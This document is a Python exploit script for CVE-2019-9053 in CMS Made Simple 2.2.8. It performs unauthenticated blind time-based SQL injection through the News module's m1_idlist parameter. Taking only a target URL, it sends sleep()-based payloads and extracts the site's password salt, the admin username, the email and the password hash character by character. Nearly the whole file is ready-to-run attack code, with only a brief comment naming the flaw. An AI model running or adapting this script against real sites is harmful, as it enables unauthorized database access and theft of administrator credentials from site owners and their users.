import argparse
import requests
import re
import time
import sys
import string
from log_colors import *
requests.packages.urllib3.disable_warnings()

# An issue was discovered in 
# CMS Made Simple 2.2.8. It is possible with the News module, 
# through a crafted URL, to achieve unauthenticated 
# blind time-based SQL injection via the m1_idlist parameter.
class CVE2019_9053:
    TIME = 1
    salt, db_name = '', ''
    email, password = '', ''
    
    # wordlist for crack password
    def __init__(self, url): #, wordlist):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.vuln_url = self.url + '/moduleinterface.php?mact=News,m1_,default,0'
        #self.wordlist = wordlist
        self.session = requests.Session()
        self.letters = '1234567890'
        self.letters += 'qazwsxedcrfvtgbyhnujmikolp'
        self.letters += 'QAZWSXEDCRFVTGBYHNUJMIKOLP'
        self.letters += '@._-$'

    # dump salt
    def dump_salt(self):
        flag = True
        ord_salt, ord_salt_tmp = "", ""
        print (LogColors.BLUE + "dump salt..." + LogColors.ENDC)
        while flag:
            flag = False
            for i in range(0, len(self.letters)):
                tmp_salt = self.salt + self.letters[i]
                ord_salt_tmp = ord_salt + hex(ord(self.letters[i]))[2:]
                print (LogColors.YELLOW + ord_salt_tmp + LogColors.ENDC)
                payload = "a,b,1,5))+and+(select+sleep(" + str(self.TIME) + ")+"
                payload += "from+cms_siteprefs+where+sitepref_value+like+"
                payload += "0x" + ord_salt_tmp + "25+and+sitepref_name+like+"
                payload += "0x736974656d61736b)+--+"
                url = self.vuln_url + "&m1_idlist=" + payload
                print (LogColors.YELLOW + "request:" + LogColors.ENDC)
                print (LogColors.YELLOW + url + LogColors.ENDC)
                start = time.time()
                r = self.session.get(url)
                elapsed_time = time.time() - start
                if elapsed_time >= self.TIME:
                    flag = True
                    break
            if flag:
                self.salt = tmp_salt
                ord_salt = ord_salt_tmp
        flag = True
        print (LogColors.YELLOW + "salt:" + self.salt + LogColors.ENDC)
        return self.salt

    # dump username
    def dump_username(self):
        flag = True
        ord_db_name, ord_db_name_tmp = "", ""
        print (LogColors.BLUE + "dump username..." + LogColors.ENDC)
        while flag:
            flag = False
            for i in range(0, len(self.letters)):
                tmp_db_name = self.db_name + self.letters[i]
                ord_db_name_tmp = ord_db_name + hex(ord(self.letters[i]))[2:]
                print (LogColors.YELLOW + tmp_db_name + LogColors.ENDC)
                payload = "a,b,1,5))+and+(select+sleep(" + str(self.TIME) + ")+from+cms_users"
                payload += "+where+username+like+0x" + ord_db_name_tmp
                payload += "25+and+user_id+like+0x31)+--+"
                
                url = self.vuln_url + "&m1_idlist=" + payload
                print (LogColors.YELLOW + "request:" + LogColors.ENDC)
                print (LogColors.YELLOW + url + LogColors.ENDC)
                start = time.time()
                r = self.session.get(url)
                elapsed_time = time.time() - start
                if elapsed_time >= self.TIME:
                    flag = True
                    break
            if flag:
                self.db_name = tmp_db_name
                ord_db_name = ord_db_name_tmp
        flag = True
        print (LogColors.YELLOW + "username:" + self.db_name + LogColors.ENDC)
        return self.db_name

    # dump email
    def dump_email(self):
        flag = True
        ord_email, ord_email_tmp = "", ""
        print (LogColors.BLUE + "dump email..." + LogColors.ENDC)
        while flag:
            flag = False
            for i in range(0, len(self.letters)):
                tmp_email = self.email + self.letters[i]
                ord_email_tmp = ord_email + hex(ord(self.letters[i]))[2:]
                print (LogColors.YELLOW + tmp_email + LogColors.ENDC)
                
                payload = "a,b,1,5))+and+(select+sleep(" + str(self.TIME) + ")+from+cms_users"
                payload += "+where+email+like+0x" + ord_email_tmp
                payload += "25+and+user_id+like+0x31)+--+"
                
                url = self.vuln_url + "&m1_idlist=" + payload
                print (LogColors.YELLOW + "request:" + LogColors.ENDC)
                print (LogColors.YELLOW + url + LogColors.ENDC)
                start = time.time()
                r = self.session.get(url)
                elapsed_time = time.time() - start
                if elapsed_time >= self.TIME:
                    flag = True
                    break
            if flag:
                self.email = tmp_email
                ord_email = ord_email_tmp
        flag = True
        print (LogColors.YELLOW + "email:" + self.email + LogColors.ENDC)
        return self.email

    # dump password
    def dump_password(self):
        flag = True
        ord_password, ord_password_tmp = "", ""
        print (LogColors.BLUE + "dump password..." + LogColors.ENDC)
        while flag:
            flag = False
            for i in range(0, len(self.letters)):
                tmp_password = self.password + self.letters[i]
                ord_password_tmp = ord_password + hex(ord(self.letters[i]))[2:]
                print (LogColors.YELLOW + tmp_password + LogColors.ENDC)
                payload = "a,b,1,5))+and+(select+sleep(" + str(self.TIME) + ")+from+cms_users"
                payload += "+where+password+like+0x" + ord_password_tmp
                payload += "25+and+user_id+like+0x31)+--+"
                
                url = self.vuln_url + "&m1_idlist=" + payload
                print (LogColors.YELLOW + "request:" + LogColors.ENDC)
                print (LogColors.YELLOW + url + LogColors.ENDC)
                start = time.time()
                r = self.session.get(url)
                elapsed_time = time.time() - start
                if elapsed_time >= self.TIME:
                    flag = True
                    break
            if flag:
                self.password = tmp_password
                ord_password = ord_password_tmp
        flag = True
        print (LogColors.YELLOW + "password:" + self.password + LogColors.ENDC)
        return self.password

    # exploitation
    def exploit(self):
        self.dump_salt()
        self.dump_username()
        self.dump_email()
        self.dump_password()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    # parser.add_argument('-w','--wordlist', required = True, help = "wordlist cracking password")
    args = vars(parser.parse_args())
    url = args['url']
    #wordlist = args['wordlist']
    cve = CVE2019_9053(url) #, wordlist)
    cve.exploit()

